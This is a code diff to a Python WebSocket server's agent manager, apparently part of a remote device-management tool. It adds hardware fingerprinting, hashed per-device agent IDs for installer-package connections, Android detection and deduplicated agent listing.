@@ -7,6 +7,7 @@ import time
 import json
 import logging
 import os
+import hashlib
 from .mirror_delivery import LowLatencyMirrorViewerSession
 from typing import Dict, Any, Optional
 from fastapi import WebSocket
@@ -151,6 +152,8 @@ class ConnectedAgent:
         return False
 
     def update_info(self, info: Dict[str, Any]):
+        # Never allow client telemetry to overwrite the server-assigned agent_id
+        info["agent_id"] = self.agent_id
         # Lock endpoint_tag: preserve established tag so heartbeats can never alter it
         current_tag = self.client_info.get("endpoint_tag")
         if current_tag:
@@ -263,69 +266,159 @@ class AgentManager:
         if agent_id in self.registered_agents:
             self.registered_agents[agent_id]["endpoint_tag"] = new_tag
 
+    @staticmethod
+    def _extract_device_fingerprint(info: Dict[str, Any], ws: Optional[WebSocket] = None) -> str:
+        """Extracts a stable physical hardware fingerprint for device disambiguation."""
+        dev_id = str(info.get("device_id") or info.get("android_id") or "").strip()
+        if dev_id and dev_id != info.get("agent_id"):
+            return f"dev:{dev_id.lower()}"
+
+        raw_host = str(info.get("hostname") or info.get("device_name") or "").strip()
+        host_clean = raw_host.lower() if raw_host and raw_host.lower() not in ("unknown", "localhost", "none", "android phone", "desktop-target") else ""
+
+        raw_ip = str(info.get("local_ip") or info.get("ip") or "").strip()
+        if (not raw_ip or raw_ip in ("127.0.0.1", "::1", "0.0.0.0")) and ws and hasattr(ws, "client") and ws.client:
+            raw_ip = str(ws.client.host)
+        ip_clean = raw_ip if raw_ip and raw_ip not in ("127.0.0.1", "::1", "0.0.0.0") else ""
+
+        parts = []
+        if host_clean:
+            parts.append(host_clean)
+        if ip_clean:
+            parts.append(ip_clean)
+        if parts:
+            return ":".join(parts)
+        return ""
+
+    @staticmethod
+    def _is_distinct_physical_device(existing_info: Dict[str, Any], new_info: Dict[str, Any],
+                                    existing_ws: Optional[WebSocket] = None, new_ws: Optional[WebSocket] = None) -> bool:
+        """Determines if incoming connection is from a distinct physical device rather than a reconnect."""
+        new_dev = str(new_info.get("device_id") or new_info.get("android_id") or "").strip().lower()
+        ext_dev = str(existing_info.get("device_id") or existing_info.get("android_id") or "").strip().lower()
+        if new_dev and ext_dev:
+            return new_dev != ext_dev
+
+        new_host = str(new_info.get("hostname") or new_info.get("device_name") or "").strip().lower()
+        ext_host = str(existing_info.get("hostname") or existing_info.get("device_name") or "").strip().lower()
+        ignore_hosts = ("unknown", "localhost", "none", "", "android phone", "desktop-target")
+        if new_host and ext_host and new_host not in ignore_hosts and ext_host not in ignore_hosts:
+            if new_host != ext_host:
+                return True
+
+        new_ip = str(new_info.get("local_ip") or new_info.get("ip") or "").strip()
+        if (not new_ip or new_ip in ("127.0.0.1", "::1")) and new_ws and hasattr(new_ws, "client") and new_ws.client:
+            new_ip = str(new_ws.client.host)
+        ext_ip = str(existing_info.get("local_ip") or existing_info.get("ip") or "").strip()
+        if (not ext_ip or ext_ip in ("127.0.0.1", "::1")) and existing_ws and hasattr(existing_ws, "client") and existing_ws.client:
+            ext_ip = str(existing_ws.client.host)
+
+        if new_ip and ext_ip and new_ip not in ("127.0.0.1", "::1") and ext_ip not in ("127.0.0.1", "::1"):
+            if new_ip != ext_ip and (new_host != ext_host or (new_info.get("is_android") or existing_info.get("is_android"))):
+                return True
+
+        return False
+
     def register_connection(self, agent_id: str, ws: WebSocket, info: Dict[str, Any]) -> Optional[ConnectedAgent]:
         self.decommissioned_agents.discard(agent_id)
 
-        # Permanent Lock: Preserve existing tag if previously registered or active for this agent_id
-        if agent_id in self.registered_agents:
-            existing_tag = self.registered_agents[agent_id].get("endpoint_tag")
-            if existing_tag:
-                info["endpoint_tag"] = existing_tag
-            if self.registered_agents[agent_id].get("is_android"):
-                info["is_android"] = True
-                info["arch"] = "android"
-                info["os"] = "Android device"
-                info["platform"] = "android"
-                info["device_type"] = "phone"
-        elif agent_id in self.active_agents:
-            existing_tag = self.active_agents[agent_id].client_info.get("endpoint_tag")
-            if existing_tag:
-                info["endpoint_tag"] = existing_tag
-            if self.active_agents[agent_id].client_info.get("is_android"):
-                info["is_android"] = True
-                info["arch"] = "android"
-                info["os"] = "Android device"
-                info["platform"] = "android"
-                info["device_type"] = "phone"
-
-        # Check AgentRegistry if platform not yet marked
-        if not info.get("is_android"):
+        # 1. Precise Android platform identification
+        is_android = (
+            info.get("is_android") is True or
+            "android" in str(info.get("arch", "")).lower() or
+            "android" in str(info.get("os", "")).lower() or
+            "android" in str(info.get("platform", "")).lower() or
+            info.get("device_type") == "phone"
+        )
+        if not is_android:
             try:
                 from .registry import AgentRegistry
                 pkg = AgentRegistry.get_package(agent_id)
                 if pkg:
                     pkg_arch = str(pkg.get("arch", "")).lower()
                     if "android" in pkg_arch or pkg.get("apk_filename") or pkg.get("sh_filename"):
-                        info["is_android"] = True
-                        info["arch"] = "android"
-                        info["os"] = "Android device"
-                        info["platform"] = "android"
-                        info["device_type"] = "phone"
-                    if not info.get("endpoint_tag") and pkg.get("endpoint_tag"):
-                        info["endpoint_tag"] = pkg.get("endpoint_tag")
+                        is_android = True
             except Exception:
                 pass
 
-        now = time.time()
-        if agent_id in self.active_agents:
-            existing = self.active_agents[agent_id]
-            is_android = info.get("is_android") or info.get("platform") == "android" or existing.client_info.get("is_android")
-            # For Android or reconnecting agents, gracefully supersede old socket
-            if not is_android and (now - existing.last_heartbeat) < 15.0:
-                logger.info(f"Rejecting duplicate connection for agent '{agent_id}' because an active session is already connected and healthy.")
-                return None
-            else:
-                logger.info(f"Agent '{agent_id}' superseding previous WebSocket connection.")
-                try:
-                    import asyncio
-                    asyncio.create_task(existing.ws.close(code=1000, reason="Superseded by reconnect"))
-                except Exception:
-                    pass
+        if is_android:
+            info["is_android"] = True
+            info["arch"] = "android"
+            info["os"] = "Android device"
+            info["platform"] = "android"
+            info["device_type"] = "phone"
 
-        agent = ConnectedAgent(agent_id, ws, info)
-        self.active_agents[agent_id] = agent
-        self.registered_agents[agent_id] = agent.to_dict()
-        logger.info(f"Agent '{agent_id}' ({info.get('hostname')}) registered online with locked tag '{info.get('endpoint_tag')}'.")
+        # 2. Extract hardware device fingerprint
+        device_fp = self._extract_device_fingerprint(info, ws)
+
+        # 3. Check if agent_id is an installer package ID
+        resolved_agent_id = agent_id
+        is_package_id = False
+        try:
+            from .registry import AgentRegistry
+            if AgentRegistry.get_package(agent_id) is not None:
+                is_package_id = True
+        except Exception:
+            pass
+
+        # Disambiguate if connecting with installer package token
+        if is_package_id:
+            info["package_id"] = agent_id
+            info["installer_id"] = agent_id
+            client_dev_id = str(info.get("device_id") or info.get("android_id") or "").strip()
+            if client_dev_id and client_dev_id != agent_id:
+                resolved_agent_id = hashlib.sha256(f"{agent_id}:{client_dev_id}".encode()).hexdigest()[:8]
+            elif device_fp:
+                resolved_agent_id = hashlib.sha256(f"{agent_id}:{device_fp}".encode()).hexdigest()[:8]
+            else:
+                resolved_agent_id = agent_id
+
+        # 4. Check if resolved_agent_id currently has an active connection
+        now = time.time()
+        if resolved_agent_id in self.active_agents:
+            existing = self.active_agents[resolved_agent_id]
+            is_distinct = self._is_distinct_physical_device(existing.client_info, info, existing.ws, ws)
+            if is_distinct:
+                # Collision with a distinct physical device! Derive an additional distinct identifier
+                resolved_agent_id = hashlib.sha256(f"{resolved_agent_id}:{device_fp}".encode()).hexdigest()[:8]
+                logger.info(f"Disambiguated distinct physical device to new agent_id: '{resolved_agent_id}'")
+            else:
+                # Same physical device reconnecting
+                is_android_dev = is_android or existing.client_info.get("is_android")
+                if not is_android_dev and (now - existing.last_heartbeat) < 15.0:
+                    logger.info(f"Rejecting duplicate connection for agent '{resolved_agent_id}' because an active session is already connected and healthy.")
+                    return None
+                else:
+                    logger.info(f"Agent '{resolved_agent_id}' superseding previous WebSocket connection.")
+                    try:
+                        import asyncio
+                        asyncio.create_task(existing.ws.close(code=1000, reason="Superseded by reconnect"))
+                    except Exception:
+                        pass
+
+        # 5. Lock agent_id and inherit/lock tags
+        info["agent_id"] = resolved_agent_id
+
+        if resolved_agent_id in self.registered_agents:
+            existing_tag = self.registered_agents[resolved_agent_id].get("endpoint_tag")
+            if existing_tag:
+                info["endpoint_tag"] = existing_tag
+        elif agent_id in self.registered_agents and not is_package_id:
+            existing_tag = self.registered_agents[agent_id].get("endpoint_tag")
+            if existing_tag:
+                info["endpoint_tag"] = existing_tag
+        elif not info.get("endpoint_tag") and is_package_id:
+            try:
+                pkg = AgentRegistry.get_package(agent_id)
+                if pkg and pkg.get("endpoint_tag"):
+                    info["endpoint_tag"] = pkg.get("endpoint_tag")
+            except Exception:
+                pass
+
+        agent = ConnectedAgent(resolved_agent_id, ws, info)
+        self.active_agents[resolved_agent_id] = agent
+        self.registered_agents[resolved_agent_id] = agent.to_dict()
+        logger.info(f"Agent '{resolved_agent_id}' ({info.get('hostname')}) registered online with locked tag '{info.get('endpoint_tag')}'.")
         return agent
 
     def unregister_connection(self, agent_id: str, ws: Optional[WebSocket] = None):
@@ -354,19 +447,30 @@ class AgentManager:
         for k, v in self.active_agents.items():
             if k.lower() == aid.lower():
                 return v
+        matching = [
+            v for v in self.active_agents.values()
+            if v.client_info.get("package_id") == aid or v.client_info.get("installer_id") == aid
+        ]
+        if len(matching) == 1:
+            return matching[0]
         return None
 
     def list_all_agents(self) -> list:
         # Returns list of all agents (online and offline, excluding decommissioned)
         results = []
-        for aid, data in list(self.registered_agents.items()):
+        seen = set()
+        for aid, agent in list(self.active_agents.items()):
             if aid in self.decommissioned_agents:
                 continue
-            if aid in self.active_agents:
-                results.append(self.active_agents[aid].to_dict())
-            else:
-                data["status"] = "offline"
-                results.append(data)
+            seen.add(aid)
+            results.append(agent.to_dict())
+        for aid, data in list(self.registered_agents.items()):
+            if aid in self.decommissioned_agents or aid in seen:
+                continue
+            seen.add(aid)
+            record = dict(data)
+            record["status"] = "offline"
+            results.append(record)
         # Stable sort: Online first, then by endpoint tag, hostname, and agent_id (prevents shuffling on heartbeats)
         return sorted(
             results,
